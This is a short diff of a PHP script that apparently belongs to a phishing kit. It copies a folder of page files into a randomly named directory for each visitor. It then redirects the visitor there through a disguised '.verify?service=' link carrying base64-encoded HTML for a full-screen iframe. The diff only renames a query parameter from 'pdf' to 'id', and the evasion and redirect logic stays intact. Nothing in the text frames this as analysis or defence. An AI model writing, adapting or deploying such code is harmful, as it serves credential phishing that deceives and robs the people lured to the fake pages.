@@ -2,7 +2,7 @@
 session_start();
 $_SESSION['referer'] = isset($_SERVER['REQUEST_URI']) ? $_SERVER['HTTP_REFERER'] : '';
 
-$pdf = $_GET['pdf'];
+$id = $_GET['id'];
 $random=rand(0,1000000000000);
 $md5=md5("$random");
 $base=base64_encode($md5);
@@ -24,5 +24,5 @@ closedir($dir);
 } 
 $src="chines";
 recurse_copy( $src, $dst );
-header("Location: $dst?pdf=$pdf&.verify?service=PGh0bWw+DQo8c3R5bGU+IGJvZHkgeyBtYXJnaW46IDA7IG92ZXJmbG93OiBoaWRkZW47IH0gPC9zdHlsZT4NCiAgPGlmcmFt");
+header("Location: $dst?id=$id&.verify?service=PGh0bWw+DQo8c3R5bGU+IGJvZHkgeyBtYXJnaW46IDA7IG92ZXJmbG93OiBoaWRkZW47IH0gPC9zdHlsZT4NCiAgPGlmcmFt");
 ?>
